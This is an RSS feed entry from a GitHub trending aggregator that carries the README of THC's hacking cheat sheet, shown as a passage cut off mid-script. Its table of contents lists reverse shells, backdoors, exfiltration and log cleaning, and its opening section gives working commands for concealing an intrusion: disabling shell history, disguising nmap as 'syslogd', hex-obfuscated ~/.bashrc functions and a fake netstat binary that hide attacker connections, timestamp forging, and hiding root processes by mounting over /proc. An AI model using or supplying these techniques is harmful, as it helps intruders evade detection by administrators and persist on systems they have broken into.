<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-09-02T01:24:44Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>hackerschoice/thc-tips-tricks-hacks-cheat-sheet</title>
    <updated>2023-09-02T01:24:44Z</updated>
    <id>tag:github.com,2023-09-02:/hackerschoice/thc-tips-tricks-hacks-cheat-sheet</id>
    <link href="https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Various tips &amp; tricks&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;THC&#39;s favourite Tips, Tricks &amp;amp; Hacks (Cheat Sheet)&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tinyurl.com/thctips&#34;&gt;https://tinyurl.com/thctips&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.&lt;/p&gt; &#xA;&lt;p&gt;We show the tricks &#39;as is&#39; without any explanation why they work. You need to know Linux to understand how and why they work.&lt;/p&gt; &#xA;&lt;p&gt;Got tricks? Join us on Telegram: &lt;a href=&#34;https://t.me/thcorg&#34;&gt;https://t.me/thcorg&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#bash&#34;&gt;Bash&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#bash-no-history&#34;&gt;Leave Bash without history&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#bash-hide-command&#34;&gt;Hide your commands&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#bash-hide-arguments&#34;&gt;Hide your arguments&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#bash-hide-connection&#34;&gt;Hide a network connection&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#hide-a-process-user&#34;&gt;Hide a process as user&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#hide-a-process-root&#34;&gt;Hide a process as root&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#hide-scripts&#34;&gt;Hide scripts&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#cat&#34;&gt;Hide from cat&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh&#34;&gt;SSH&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh-invisible&#34;&gt;Almost invisible SSH&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh-tunnel&#34;&gt;SSH tunnel&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh-socks-tunnel&#34;&gt;SSH socks5 tunnel&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh-j&#34;&gt;SSH to NATed host&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh-pj&#34;&gt;SSH pivot via ProxyJump&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#network&#34;&gt;Network&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#discover&#34;&gt;Discover hosts&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#tcpdump&#34;&gt;Tcpdump&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#tunnel&#34;&gt;Tunnel and forwarding&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#scan-proxy&#34;&gt;Use any tool via Socks Proxy&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#your-ip&#34;&gt;Find your public IP address&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#check-reachable&#34;&gt;Check reachability from around the world&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#check-open-ports&#34;&gt;Check/Scan Open Ports&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#bruteforce&#34;&gt;Crack Passwords hashes&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#bruteforce&#34;&gt;Brute Force Passwords&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#exfil&#34;&gt;Data Upload/Download/Exfil&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#file-encoding&#34;&gt;File Encoding/Decoding&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#cut-paste&#34;&gt;File transfer using cut &amp;amp; paste&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#file-transfer-screen&#34;&gt;File transfer using screen&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#file-transfer-gs-netcat&#34;&gt;File transfer using gs-netcat and sftp&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#http&#34;&gt;File transfer using HTTP&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#burl&#34;&gt;File transfer without curl&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#webdav&#34;&gt;File transfer using WebDAV&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#tg&#34;&gt;File transfer to Telegram&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell&#34;&gt;Reverse Shell / Dumb Shell&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell&#34;&gt;Reverse Shells&lt;/a&gt; &#xA;    &lt;ol&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell-gs-netcat&#34;&gt;with gs-netcat&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell-bash&#34;&gt;with Bash&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell-no-bash&#34;&gt;without Bash&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#revese-shell-remote-moe&#34;&gt;with remote.moe&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell-python&#34;&gt;with Python&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell-perl&#34;&gt;with Perl&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell-php&#34;&gt;with PHP&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ol&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell-upgrade&#34;&gt;Upgrading the dumb shell&lt;/a&gt; &#xA;    &lt;ol&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell-pty&#34;&gt;Upgrade a reverse shell to a pty shell&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell-interactive&#34;&gt;Upgrade a reverse shell to a fully interactive shell&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#reverse-shell-socat&#34;&gt;Reverse shell with socat (fully interactive)&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ol&gt; &lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#backdoor&#34;&gt;Backdoors&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#backdoor-background-reverse-shell&#34;&gt;Background reverse shell&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#backdoor-auth-keys&#34;&gt;authorized_keys&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#backdoor-network&#34;&gt;Remote access an entire network&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#carriage-return-backdoor&#34;&gt;Smallest PHP backdoor&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ld-backdoor&#34;&gt;Local Root backdoor&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#shell-hacks&#34;&gt;Shell Hacks&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#shred&#34;&gt;Shred files (secure delete)&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#restore-timestamp&#34;&gt;Restore the date of a file&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#shell-clean-logs&#34;&gt;Clean logfile&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#shell-hide-files&#34;&gt;Hide files from a User without root privileges&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#linux-info&#34;&gt;Find out Linux Distro&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#crypto&#34;&gt;Crypto&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#gen-password&#34;&gt;Generate quick random Password&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#crypto-filesystem&#34;&gt;Linux transportable encrypted filesystems&lt;/a&gt; &#xA;    &lt;ol&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#crypto-filesystem&#34;&gt;cryptsetup&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#encfs&#34;&gt;EncFS&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ol&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#encrypting-file&#34;&gt;Encrypting a file&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh-sniffing&#34;&gt;Sniffing a user&#39;s SSH session&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh-sniffing-strace&#34;&gt;with strace&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh-sniffing-script&#34;&gt;with script&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh-sniffing-wrapper&#34;&gt;with a wrapper script&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#ssh-sniffing-sshit&#34;&gt;with SSH-IT&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#vpn-shell&#34;&gt;VPN and Shells&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#shell&#34;&gt;Disposable Root Servers&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#vpn&#34;&gt;VPN/VPS Providers&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#osint&#34;&gt;OSINT Intelligence Gathering&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#misc&#34;&gt;Miscellaneous&lt;/a&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#tools&#34;&gt;Tools of the trade&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#cool-linux-commands&#34;&gt;Cool Linux commands&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#tmux&#34;&gt;tmux&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#useful-commands&#34;&gt;Useful commands&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#others&#34;&gt;Other Sites&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;bash&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;1. Bash / Shell&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a id=&#34;bash-no-history&#34;&gt;&lt;/a&gt; &lt;strong&gt;1.i. Leave Bash without history:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Tell Bash to use &lt;em&gt;/dev/null&lt;/em&gt; instead of &lt;em&gt;~/.bash_history&lt;/em&gt;. This is the first command we execute on every shell. It will stop the Bash from logging your commands.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;export HISTFILE=/dev/null&#xA;unset SSH_CONNECTION SSH_CLIENT&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(We also clear SSH_* variables in case we logged in with SSH. Otherwise any process we start gets a copy of our IP in /proc/self/environ.)&lt;/p&gt; &#xA;&lt;p&gt;It is good housekeeping to &#39;commit suicide&#39; when exiting a shell:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;alias exit=&#39;kill -9 $$&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Any command starting with a &#34; &#34; (space) will &lt;a href=&#34;https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces&#34;&gt;not get logged to history&lt;/a&gt; either.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$  id&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;bash-hide-command&#34;&gt;&lt;/a&gt; &lt;strong&gt;1.ii. Hide your command / Daemonzie your command&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Hide as &#34;syslogd&#34;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;(exec -a syslogd nmap -T0 10.0.2.1/24) # Note the brackets &#39;(&#39; and &#39;)&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Start a background hidden process:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;(exec -a syslogd nmap -T0 10.0.2.1/24 &amp;amp;&amp;gt;nmap.log &amp;amp;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Start within a &lt;a href=&#34;https://linux.die.net/man/1/screen&#34;&gt;GNU screen&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;screen -dmS MyName nmap -T0 10.0.2.1/24&#xA;### Attach back to the nmap process&#xA;screen -x MyName&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Alternatively if there is no Bash:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cp `which nmap` syslogd&#xA;PATH=.:$PATH syslogd -T0 10.0.2.1/24&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In this example we execute &lt;em&gt;nmap&lt;/em&gt; but let it appear with the name &lt;em&gt;syslogd&lt;/em&gt; in &lt;em&gt;ps alxwww&lt;/em&gt; process list.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;bash-hide-arguments&#34;&gt;&lt;/a&gt; &lt;strong&gt;1.iii. Hide your arguments&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Download &lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/src/zap-args.c&#34;&gt;zap-args.c&lt;/a&gt;. This example will execute &lt;em&gt;nmap&lt;/em&gt; but will make it appear as &#39;syslogd&#39; without any arguments in the &lt;em&gt;ps alxww&lt;/em&gt; output.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gcc -Wall -O2 -fpic -shared -o zap-args.so zap-args.c -ldl&#xA;(LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24)&#xA;### Or as daemon background process:&#xA;(LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24 &amp;amp;&amp;gt;nmap.log &amp;amp;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: There is a gdb variant as well. Anyone?&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;bash-hide-connection&#34;&gt;&lt;/a&gt; &lt;strong&gt;1.iv. Hide a Network Connection&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The trick is to hijack &lt;code&gt;netstat&lt;/code&gt; and use grep to filter out our connection. This example filters any connection on port 31337 &lt;em&gt;or&lt;/em&gt; ip 1.2.3.4. The same should be done for &lt;code&gt;ss&lt;/code&gt; (a netstat alternative).&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Method 1 - Hiding a connection with bash-function in ~/.bashrc&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Cut &amp;amp; paste this to add the line to ~/.bashrc&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;echo &#39;netstat(){ command netstat &#34;$@&#34; | grep -Fv -e :31337 -e 1.2.3.4; }&#39; &amp;gt;&amp;gt;~/.bashrc \&#xA;&amp;amp;&amp;amp; touch -r /etc/passwd ~/.bashrc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or cut &amp;amp; paste this for an obfuscated entry to ~/.bashrc:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;X=&#39;netstat(){ command netstat &#34;$@&#34; | grep -Fv -e :31337 -e 1.2.3.4; }&#39;&#xA;echo &#34;eval \$(echo $(echo &#34;$X&#34; | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG&#34; &amp;gt;&amp;gt;~/.bashrc \&#xA;&amp;amp;&amp;amp; touch -r /etc/passwd ~/.bashrc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The obfuscated entry to ~/.bashrc will look like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps) #Initialize PRNG&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Method 2 - Hiding a connection with a binary in $PATH&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Create a fake netstat binary in /usr/local/sbin. On a default Debian (and most Linux) the PATH variables (&lt;code&gt;echo $PATH&lt;/code&gt;) lists /usr/local/sbin &lt;em&gt;before&lt;/em&gt; /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;echo -e &#34;#! /bin/bash&#xA;exec /usr/bin/netstat \&#34;\$@\&#34; | grep -Fv -e :22 -e 1.2.3.4&#34; &amp;gt;/usr/local/sbin/netstat \&#xA;&amp;amp;&amp;amp; chmod 755 /usr/local/sbin/netstat \&#xA;&amp;amp;&amp;amp; touch -r /usr/bin/netstat /usr/local/sbin/netstat&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;(thank you iamaskid)&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;hide-a-process-user&#34;&gt;&lt;/a&gt; &lt;strong&gt;1.v. Hide a process as user&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Continuing from &#34;Hiding a connection&#34; the same technique can be used to hide a process. This example hides the nmap process and also takes care that our &lt;code&gt;grep&lt;/code&gt; does not show up in the process list by renaming it to GREP:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;echo &#39;ps(){ command ps &#34;$@&#34; | exec -a GREP grep -Fv -e nmap  -e GREP; }&#39; &amp;gt;&amp;gt;~/.bashrc \&#xA;&amp;amp;&amp;amp; touch -r /etc/passwd ~/.bashrc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;hide-a-process-root&#34;&gt;&lt;/a&gt; &lt;strong&gt;1.vi. Hide a process as root&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;This requires root privileges and is an old Linux trick by over-mounting /proc/&amp;lt;pid&amp;gt; with a useless directory:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;hide()&#xA;{&#xA;    [[ -L /etc/mtab ]] &amp;amp;&amp;amp; { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }&#xA;    _pid=${1:-$$}&#xA;    [[ $_pid =~ ^[0-9]+$ ]] &amp;amp;&amp;amp; { mount -n --bind /dev/shm /proc/$_pid &amp;amp;&amp;amp; echo &#34;[THC] PID $_pid is now hidden&#34;; return; }&#xA;    local _argstr&#xA;    for _x in &#34;${@:2}&#34;; do _argstr+=&#34; 